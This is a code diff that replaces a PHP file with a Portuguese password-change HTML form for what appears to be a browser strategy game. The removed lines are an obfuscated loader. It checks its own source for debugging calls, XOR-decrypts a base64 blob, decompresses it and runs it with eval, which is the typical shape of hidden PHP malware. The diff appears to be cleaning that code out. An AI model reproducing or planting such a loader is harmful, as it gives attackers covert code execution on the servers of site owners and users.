@@ -1,24 +1,33 @@
-<?php
-$qknutrygrd="1eccc64519304753d9654a7757504e16";
-$lqsmtob="015253560550000403080b0401010500565a01020c5604545103570452065501";
-$ckekkbzpz="SO2dYSsN73EijD/GKjBhr3kJKk1TEqohyznDDfABou2Bg1SK1N2mgM180JUKlg/yTc8UmlTbo7NS8Hr/VZiQ6auQbSCL4d5aFeF7FOZUoUBPGmaP0uE5YTClnoSwAj4wTN/UKQi3F51DdiZQPcAqt14HkzYvJQNj/hx5inR7v1So9Cffb8I91Zc2JI8mn9DoHEy3CAXaG+N/3DstDJH1QQgYQqI6uyVhStmQkrsfvoWcojpBu2KB9fU5FU50e5j1nL6vlSYOCZz5HW8C8ZPr/2+IBVdMdIKv8h/n0ljIdoo0CzS35ZRljgkC9ofZKZenNmFeH3Bg4ml/tN2OVZ/L/4nwAREW2UtloIA7ZF8kIhBYUaYlNOrNVAMDE9oZjhvtCevAWqyhTcckd1mcmG97nGM7qek7iuRLsSB3rzs4y3ZjW50dVaEXVrsz0xyYH4O1V+Q/IYVjOXhOvyc9icWGzKUjZwoGN/lz37h0LR1wWakCsCtDYYBbeT4OblVFBXfUSYR9SYtbWagUmqpMJEeVO1imlwXTUgtPwPH3Ib3wIl3KEK3hczOVQXc7QPoHhXp/8HrYptnmT33Ta/O7xsmszrYgWJEXOzDyQ63JtCHRRe8IJbuizZvAb0ODnp+aeL4rzeg8zo1IWY/NQkf2B4wPnm0TyNHGoO2myM4kukR8l0a8uJ+qBQJPA3nbhc3mzpuELDbwpR9Y+ODv5M+A6pzyHqcQi6nNh3S9nanZ9GNJMJKuyUo=";
-$rrvubdmr=file_get_contents(__FILE__);
-$tuuawg=str_replace($ckekkbzpz,"",$rrvubdmr);
-if(strpos($tuuawg,"ec"."ho")!==false||strpos($tuuawg,"pr"."int")!==false||strpos($tuuawg,"var_"."dump")!==false||strpos($tuuawg,"file_put_"."contents")!==false||strpos($tuuawg,"fw"."rite")!==false){die();}
-$dwnagp=str_replace(array($qknutrygrd,$lqsmtob),array("SP_0fb3c804","KP_a7090536"),$rrvubdmr);
-$tqyaxaut=md5($dwnagp);
-$jqgujij=hex2bin($lqsmtob);
-$fnxvtu="";
-$ycpcfitj=strlen($tqyaxaut);
-for($uvfqiycdz=0;$uvfqiycdz<$ycpcfitj;$uvfqiycdz++){
-$fnxvtu.=chr(ord($jqgujij[$uvfqiycdz])^ord($tqyaxaut[$uvfqiycdz]));
-}
-$opxjlr=base64_decode($ckekkbzpz);
-$jjipmmoy=strlen($opxjlr);
-$ednengfb="";
-$dlsefmynes=strlen($fnxvtu);
-for($uvfqiycdz=0;$uvfqiycdz<$jjipmmoy;$uvfqiycdz++){
-$ednengfb.=$opxjlr[$uvfqiycdz]^$fnxvtu[$uvfqiycdz%$dlsefmynes];
-}
-$ttnklyj="gzun"."compress";
-eval('?>' . $ttnklyj($ednengfb) . '<?php ');
+<h3>Mudar senha</h3>
+<p>Pode alterar sua senha aqui. Para fazer isso, digite suas senhas antigas e novas. Deve inserir a nova senha duas
+    vezes para ter certeza.</p>
+<p>Se esqueceu a sua senha, pode solicitar uma nova aqui &gt; <a href="/lost_pw.php" target="_blank">esqueci a senha</a>
+</p>
+<p>Sua nova senha será alterada em <em>todos os mundos</em> e será válida <em>imediatamente</em> após a alteração. Não
+    precisa ser confirmado por e-mail.</p>
+
+<form method="post"
+    action="game.php?village=<?= $village['id'] ?>&screen=settings&mode=change_passwd&action=change_passwd&h=<?= $hkey ?>">
+    <table class="vis">
+        <tbody>
+            <tr>
+                <td><label for="old_passwd">Senha Antiga</label></td>
+                <td><input name="old_passwd" id="old_passwd" type="password"></td>
+            </tr>
+            <tr>
+                <td><label for="new_passwd">Nova Senha</label></td>
+                <td><input name="new_passwd" id="new_passwd" type="password"></td>
+
+            </tr>
+            <tr>
+                <td><label for="new_passwd_rpt">Repetir Senha:</label></td>
+                <td><input name="new_passwd_rpt" id="new_passwd_rpt" type="password"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input value="Mudar senha" type="submit"></td>
+
+            </tr>
+        </tbody>
+    </table>
+</form>
